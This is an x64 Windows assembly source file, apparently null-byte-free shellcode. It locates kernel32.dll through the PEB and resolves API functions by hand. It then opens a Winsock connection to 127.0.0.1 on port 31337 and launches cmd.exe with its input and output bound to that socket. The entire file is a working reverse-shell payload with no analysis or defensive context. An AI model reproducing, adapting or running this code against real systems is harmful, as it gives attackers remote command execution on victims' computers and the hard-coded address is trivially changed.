.code
mainW PROC
; GET BASE ADDRESS OF KERNEL32.
	; Get PEB
	xor rcx, rcx
	xor rbx, rbx
	xor r10, r10
	mov r13, gs:[rcx + 60h] ; Avoid Null byte.

	; Get LDR struct from PEB.
	mov r13, [r13 + 18h]

	; Get LDR.InMemoryOrderModuleList member of LDR struct.
	mov rsi, [r13 + 20h]

	; Get next entry in linked list (This will always be ntdll.dll).
	lodsq	; Load QWORD at RSI into RAX.
	xchg rax, rsi ; Switch out RAX and RAX.
	
	; Get next entry in linked list (3rd entry will always be kernel32.dll).
	lodsq   ; Same as before, but now rax points to kernel32.dll entry in LDR.InMemoryOrderModuleList.
	xor r13, r13

	; Get base address of kernel32.dll.
	mov r15, [rax + 20h]

; PARSE EXPORT TABLE.
	; Get PE signature in Kernel32.dll
	mov r14d, [r15 + 3Ch]	; Get PE header offset.
	add r14, r15			; Add that offset to the base of kernel32.dll

	; Move 0x88 into rcx without the use of a null byte.
	inc rcx
	inc rcx
	shl rcx, 6h
	inc rcx
	inc rcx
	inc rcx
	inc rcx
	inc rcx
	inc rcx
	inc rcx
	inc rcx

	; Get offset from PE signature to Export Table.
	; The RVA of the export table is located 0x88 bytes from the PE signature 
	; in Kernel32.dll. 
	mov edx, [r14 + rcx]

	; Get Address of export table.
	add rdx, r15 ; RDX = Export Table address = Base address of Kernel32.dll + RVA of Export Table

	; Get Number of functions.
	mov eax, [rdx + 14h]

	; Get AddressOfNames RVA.
	mov ebx, [rdx + 20h]

	; Get AddressOfNames VMA (the actual address as viewed by the process.)
	add rbx, r15

; SEARCH FOR `GetProcAddress` IN EXPORT TABLE.
	mov ecx, eax
	mov rax, 41636f7250746547h
	GetProcAddrLoop:
		jecxz TargetAcquired ; Loop until ecx is 0 (i.e as many times as there are function entries in the export table).
		xor r10, r10
		mov r10d, [rbx+4+rcx*4] ; Get RVA of next entry in Export Table (+4 to skip first entry, since it appears not to be a valid string name).
		add r10, r15
		dec ecx
		cmp [r10], rax
		jnz GetProcAddrLoop

; GET FUNCTION ORDINAL FROM `AddressOfNameOrdinals`
	TargetAcquired:
		xor rbx, rbx
		mov ebx, [rdx + 24h] ; RVA of AddressOfNames Ordinals 
		add rbx, r15 ; RVA + base address of Kernel32.dll = VMA of AddressOfNames Ordinals.

		; Get ordinal of GetProcAddress.
		inc rcx ; Because the loop decrements before the comparison, so we need to increment by one to get the right ordinal.
		mov r13w, [rbx+rcx*2] ; Because each ordinal is 2 bytes in size, and rcx is the index of the ordinal record, with rbx being the addr of AddressOfNames Ordinals.

; GET FUNCTION ADDRESS FROM `AddressOfFunctions` STRUCT.
	xor r11, r11
	xor rbx, rbx
	mov r11d, [rdx + 1Ch] ; AddressOfFunctions struct RVA (rdx still points to export table).
	add r11, r15 ; Base of Kernel32.dll + RVA of AddressOfFunctions.
	mov ebx, [r11+4+r13*4] ; Skip the first entry, r13 is the ordinal, *4 because the RVA is a DWORD.
	add rbx, r15 ; Base of Kernel32.dll + RVA of GetProcAddr = Address of GetProcAddress().

; GET ADDRESS OF `LoadLibraryA`, USING `GetProcAddress()`.
	; Push 'LoadLibraryA' to the stack.
	xor rax, rax
	mov rax, 41797261h
	push rax
	mov rax, 7262694c64616f4ch
	push rax
	mov rdx, rsp ; Second parameter is a pointer to 'LoadLibraryA'.
	mov rcx, r15 ; First parameter is the base address of Kernel32.dll.
	sub rsp, 30h ; Make space on the stack, because windows :)

	; Call GetProcAddress(kernel32.dll, 'LoadLibrary').
	call rbx
	add rsp, 30h ; Unwind the stack, because windows (fastcall, innit?)
	mov r14, rax ; Save the address of LoadLibraryA into r14.
	
; LOAD THE WINDOWS SOCKET LIBRARY, `WS2_32.DLL`, WITH `LoadLibraryA`.
	; Push 'WS2_32.DLL' to the stack.
	xor rax, rax
	mov rax, 6C6Ch
	push rax
	mov rax, 642E32335F325357h
	push rax
	mov rcx, rsp ; Same as before XD.
	sub rsp, 30h
	call r14
	mov r14, rax ; Save base address of WS2_32.DLL to r14.
	add rsp, 30h

; GET ADDRESS OF WSAStartup. (Essentially creates a socket object, like the pre-socket() function in Unix C).
	; Push 'WSAStartup' to the stack.
	xor rax, rax
	mov rax, 7075h
	push rax
	mov rax, 7472617453415357h
	push rax
	mov rdx, rsp
	mov rcx, r14
	sub rsp, 30h
	call rbx
	add rsp, 30h
	mov r11, rax

; WSAStartup().
	xor rcx, rcx
	mov cx, 198h
	sub rsp, rcx	; lpWSAData (output buffer for function)
	mov rdx, rsp
	mov cx, 202h	; wVersionRequired
	sub rsp, 30h	
	call r11
	add rsp, 30h

; Get `WSASocketA` Address.
	; Push 'WSASocketA' to the stack.
	xor rax, rax
	mov rax, 4174h
	push rax
	mov rax, 656b636f53415357h
	push rax
	mov rdx, rsp
	mov rcx, r14
	sub rsp, 30h
	call rbx
	add rsp, 30h
	mov r11, rax

; CREATE SOCKET WITH `WSASocketA()`.
	; Set up call parameters.
	xor rcx, rcx
	; Set up.
	sub rsp, 30h
	mov [rsp+20h], rcx
	mov [rsp+28h], rcx
	mov r8, rcx
	inc rcx
	mov rdx, rcx
	inc rcx
	add r8,6
	xor r9, r9
	call r11
	mov r13, rax
	add rsp, 30h
	

; GET `WSAConnect()` address.
	xor rax, rax
	mov rax, 7463h
	push rax
	mov rax, 656e6e6f43415357h
	push rax
	mov rdx, rsp
	mov rcx, r14
	sub rsp, 30h
	call rbx
	mov r12, rax

; `WSAConnect()`.
	mov rcx, r13
	mov r8, 0100007Fh ; 127.0.0.1
	push r8
	mov r8w, 697Ah ; 31337
	push r8w
	xor r8, r8
	inc r8
	inc r8
	mov rdx, r8
	push dx
	mov r8, 16h
	xor r9, r9
	mov rdx, rsp
	push r9
	push r9
	push r9
	sub rsp, 30h
	call r12

; FIND ADDRESS OF `CreateProcessA()`.
	xor rax, rax
	mov rax, 41737365636fh
	push rax
	mov rax, 7250657461657243h
	push rax
	mov rdx, rsp
	mov rcx, r15
	sub rsp, 30h
	call rbx
	add rsp, 30h
	mov r12, rax

; SET UP CALL TO `CreateProcessA()`, duplicating file descriptors to the socket fd.
	; Push 'cmd.exe' to the stack.
	xor rax, rax
	mov rax, 6578652e646d63h
	push rax
	mov rcx, rsp

	; STARTUPINFO Struct.
	push r13
	push r13
	push r13
	xor rbx, rbx
	push bx
	push rbx
	push rbx
	mov rbx, 100h
	push bx
	xor rbx, rbx
	push bx
	push bx
	push rbx
	push rbx
	push rbx
	push rbx
	push rbx
	push rbx
	mov rbx, 68h
	push rbx
	mov rdi, rsp

	; Re align the stack to a 16-byte boundry.
	inc rsp
	inc rsp
	inc rsp
	inc rsp

; Game over.
	mov rbx, rsp
	sub rbx, 20h
	push rbx
	push rdi
	xor rbx, rbx
	push rbx
	push rbx
	push rbx
	inc rbx
	push rbx
	xor rbx, rbx
	push rbx
	push rbx
	push rbx
	push rbx
	mov r8, rbx
	mov r9, rbx
	mov rdx, rcx
	mov rcx, rbx
	call r12
mainW ENDP

END